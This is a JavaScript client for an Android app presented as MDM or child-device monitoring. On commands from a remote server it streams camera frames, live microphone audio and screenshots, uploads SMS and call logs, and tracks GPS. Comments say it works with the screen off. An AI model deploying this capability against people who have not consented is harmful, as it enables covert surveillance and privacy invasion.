'use strict'

const SERVER_URL = 'http://192.168.31.25:4000'

const MdmPlugin    = window.Capacitor?.Plugins?.MdmPlugin
const NativeSocket = window.Capacitor?.Plugins?.NativeSocket

let nativeListeners = []
let videoStream = null
let audioStream = null
let mediaRecorder = null
let cameraInterval = null
let micActive = false
let batteryInterval = null

const canvas = document.createElement('canvas')
const ctx2d = canvas.getContext('2d')
const video = document.createElement('video')
video.muted = true
video.playsInline = true

// ── UI helpers ────────────────────────────────────────────────────

function setStatus(text, online) {
  const badge = document.getElementById('status-badge')
  badge.textContent = text
  badge.className = 'badge ' + (online ? 'online' : 'offline')
}

function setIndicator(type, active, statusText) {
  const dot = document.getElementById(`${type}-dot`)
  const el  = document.getElementById(`${type}-status`)
  if (!dot || !el) return
  dot.className = 'indicator-dot' + (active ? ' active' : '')
  el.textContent = statusText
  el.className   = 'indicator-status' + (active ? ' active-text' : '')
}

// ── Device ID ─────────────────────────────────────────────────────

async function getDeviceId() {
  if (MdmPlugin) {
    try {
      const info = await MdmPlugin.getDeviceInfo()
      if (info?.androidId) {
        const id = 'device-' + info.androidId.slice(0, 8)
        localStorage.setItem('mdm-device-id', id)
        return id
      }
    } catch {}
  }
  let id = localStorage.getItem('mdm-device-id')
  if (!id) { id = 'device-' + Math.random().toString(36).slice(2, 10); localStorage.setItem('mdm-device-id', id) }
  return id
}

// ── Socket abstraction (native plugin OR browser fallback) ────────

function socketEmit(event, data) {
  if (NativeSocket) {
    NativeSocket.socketEmit({ event, data: JSON.stringify(data || {}) }).catch(() => {})
  } else if (window._browserSocket) {
    window._browserSocket.emit(event, data)
  }
}

function connectToServer(deviceId) {
  document.getElementById('device-id-display').textContent = 'Device: ' + deviceId
  setStatus('Connecting…', false)

  if (NativeSocket) {
    connectNative(deviceId)
  } else {
    connectBrowser(deviceId)
  }
}

// ── Native Java socket.io (bypasses WebView SSL restrictions) ─────

async function connectNative(deviceId) {
  // Listen to CustomEvents fired directly into JS by Java evaluateJavascript
  window.addEventListener('nativesocket', handleNativeEvent)

  try {
    await NativeSocket.connect({ url: SERVER_URL, deviceId })
  } catch (e) {
    setStatus('Err: ' + e.message, false)
  }
}

function handleNativeEvent(e) {
  const { event, payload } = e.detail
  switch (event) {
    case 'connect':
      setStatus('Connected', true)
      sendDeviceInfo(); sendBattery(); startBatteryPolling()
      break
    case 'disconnect':
      setStatus('Reconnecting…', false)
      stopBatteryPolling()
      setIndicator('cam', false, 'Inactive')
      setIndicator('mic', false, 'Inactive')
      setIndicator('speak', false, 'Inactive')
      break
    case 'connect_error':
      setStatus('Err: ' + (payload || 'failed'), false)
      break
    // Camera/mic/speaker are handled natively in Java (work when screen off)
    // — just update the UI indicators here
    case 'cmd:camera:start':
    case 'cmd:camera:start:front': setIndicator('cam', true, 'Front Active'); break
    case 'cmd:camera:start:back':  setIndicator('cam', true, 'Back Active'); break
    case 'cmd:camera:stop':
    case 'cmd:camera:stop:front':
    case 'cmd:camera:stop:back':   setIndicator('cam', false, 'Inactive'); break
    case 'cmd:mic:on':             setIndicator('mic', true, 'Active'); break
    case 'cmd:mic:off':            setIndicator('mic', false, 'Inactive'); break
    case 'cmd:speak:live:start':   setIndicator('speak', true, 'Live'); break
    case 'cmd:speak:live:stop':    setIndicator('speak', false, 'Inactive'); break
    case 'cmd:speak':              setIndicator('speak', true, 'Playing…'); break
    case 'speak:done':             setIndicator('speak', false, 'Inactive'); break
    case 'cmd:screenshot':      break  // handled natively
    case 'cmd:location:start':  setIndicator('cam', true,  'GPS On'); break
    case 'cmd:location:stop':   setIndicator('cam', false, 'GPS Off'); break
    case 'cmd:get:calllogs': sendCallLogs(); break
    case 'cmd:get:sms':      sendSMS(); break
  }
}

// ── Browser socket.io fallback (for testing in browser) ──────────

function connectBrowser(deviceId) {
  if (window._browserSocket) { window._browserSocket.disconnect(); window._browserSocket = null }

  const s = io(SERVER_URL, {
    query: { role: 'child', deviceId },
    transports: ['polling', 'websocket'],
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 2000,
    reconnectionDelayMax: 15000,
  })
  window._browserSocket = s

  s.on('connect', async () => {
    setStatus('Connected', true)
    await sendDeviceInfo(); await sendBattery(); startBatteryPolling()
  })
  s.on('disconnect', () => {
    setStatus('Reconnecting…', false)
    stopCamera(); stopMic(); stopBatteryPolling()
    setIndicator('cam', false, 'Inactive')
    setIndicator('mic', false, 'Inactive')
    setIndicator('speak', false, 'Inactive')
  })
  s.on('connect_error', (err) => setStatus('Err: ' + err.message, false))
  s.on('cmd:camera:start',  startCamera)
  s.on('cmd:camera:stop',   stopCamera)
  s.on('cmd:mic:on',        startMic)
  s.on('cmd:mic:off',       stopMic)
  s.on('cmd:speak',         ({ audioData }) => playAudio(audioData))
  s.on('cmd:screenshot',    takeScreenshot)
  s.on('cmd:get:calllogs',  sendCallLogs)
  s.on('cmd:get:sms',       sendSMS)
}

// ── Device info ───────────────────────────────────────────────────

async function sendDeviceInfo() {
  try {
    if (MdmPlugin) {
      const info = await MdmPlugin.getDeviceInfo()
      socketEmit('device:info', info)
    } else {
      socketEmit('device:info', { model: 'Browser', manufacturer: 'Web', androidVersion: 'N/A', sdkInt: 0, androidId: localStorage.getItem('mdm-device-id') || 'web' })
    }
  } catch {}
}

// ── Battery ───────────────────────────────────────────────────────

async function sendBattery() {
  try {
    if (MdmPlugin) {
      const b = await MdmPlugin.getBattery()
      socketEmit('battery:update', b)
    } else if ('getBattery' in navigator) {
      const b = await navigator.getBattery()
      socketEmit('battery:update', { level: Math.round(b.level * 100), charging: b.charging })
    }
  } catch {}
}

function startBatteryPolling() { stopBatteryPolling(); batteryInterval = setInterval(sendBattery, 30000) }
function stopBatteryPolling()  { clearInterval(batteryInterval); batteryInterval = null }

// ── Call logs ─────────────────────────────────────────────────────

async function sendCallLogs() {
  if (!MdmPlugin) return
  try { const r = await MdmPlugin.getCallLogs(); socketEmit('call:logs', { logs: r.logs }) } catch {}
}

// ── SMS ───────────────────────────────────────────────────────────

async function sendSMS() {
  if (!MdmPlugin) return
  try { const r = await MdmPlugin.getSMS(); socketEmit('sms:messages', { messages: r.messages }) } catch {}
}

// ── Camera ────────────────────────────────────────────────────────

async function startCamera() {
  if (videoStream) return
  try {
    videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false })
    video.srcObject = videoStream
    await video.play()
    setIndicator('cam', true, 'Active')
    cameraInterval = setInterval(() => {
      if (!videoStream || !video.videoWidth) return
      canvas.width = video.videoWidth; canvas.height = video.videoHeight
      ctx2d.drawImage(video, 0, 0)
      socketEmit('camera:frame', { frame: canvas.toDataURL('image/jpeg', 0.6).split(',')[1] })
    }, 250)
  } catch { setIndicator('cam', false, 'Permission denied') }
}

function stopCamera() {
  clearInterval(cameraInterval); cameraInterval = null
  if (videoStream) { videoStream.getTracks().forEach(t => t.stop()); videoStream = null }
  video.srcObject = null
  setIndicator('cam', false, 'Inactive')
}

// ── Screenshot ────────────────────────────────────────────────────

async function takeScreenshot() {
  try {
    if (videoStream && video.videoWidth) {
      canvas.width = video.videoWidth; canvas.height = video.videoHeight
      ctx2d.drawImage(video, 0, 0)
      socketEmit('screenshot:data', { frame: canvas.toDataURL('image/jpeg', 0.95).split(',')[1] })
    } else {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true })
      const v = document.createElement('video')
      v.muted = true; v.playsInline = true; v.srcObject = stream
      await v.play()
      await new Promise(r => setTimeout(r, 600))
      const c = document.createElement('canvas')
      c.width = v.videoWidth; c.height = v.videoHeight
      c.getContext('2d').drawImage(v, 0, 0)
      socketEmit('screenshot:data', { frame: c.toDataURL('image/jpeg', 0.95).split(',')[1] })
      stream.getTracks().forEach(t => t.stop())
    }
  } catch {}
}

// ── Microphone ────────────────────────────────────────────────────

async function startMic() {
  if (micActive) return
  try {
    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true })
    micActive = true
    socketEmit('mic:state', { active: true })
    setIndicator('mic', true, 'Active')
    recordNextChunk()
  } catch { setIndicator('mic', false, 'Permission denied') }
}

function recordNextChunk() {
  if (!micActive || !audioStream) return
  const chunks = []
  try { mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' }) }
  catch { mediaRecorder = new MediaRecorder(audioStream) }
  mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data) }
  mediaRecorder.onstop = () => {
    if (chunks.length && micActive) {
      const reader = new FileReader()
      reader.onloadend = () => socketEmit('mic:audio', { chunk: reader.result.split(',')[1] })
      reader.readAsDataURL(new Blob(chunks, { type: 'audio/webm' }))
    }
    if (micActive) recordNextChunk()
  }
  mediaRecorder.start()
  setTimeout(() => { if (mediaRecorder?.state === 'recording') mediaRecorder.stop() }, 3000)
}

function stopMic() {
  micActive = false
  if (mediaRecorder?.state === 'recording') mediaRecorder.stop()
  mediaRecorder = null
  if (audioStream) { audioStream.getTracks().forEach(t => t.stop()); audioStream = null }
  socketEmit('mic:state', { active: false })
  setIndicator('mic', false, 'Inactive')
}

// ── Speaker ───────────────────────────────────────────────────────

async function playAudio(base64) {
  try {
    setIndicator('speak', true, 'Playing…')
    const binary = atob(base64)
    const bytes = new Uint8Array(binary.length)
    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i)
    const url = URL.createObjectURL(new Blob([bytes], { type: 'audio/webm' }))
    const audio = new Audio(url)
    audio.onended = () => { URL.revokeObjectURL(url); setIndicator('speak', false, 'Inactive') }
    audio.onerror = () => { URL.revokeObjectURL(url); setIndicator('speak', false, 'Error') }
    await audio.play()
  } catch { setIndicator('speak', false, 'Inactive') }
}

// ── Auto-start ────────────────────────────────────────────────────

window.addEventListener('load', async () => {
  const deviceId = await getDeviceId()
  document.getElementById('device-id-display').textContent = 'Device: ' + deviceId
  connectToServer(deviceId)
})
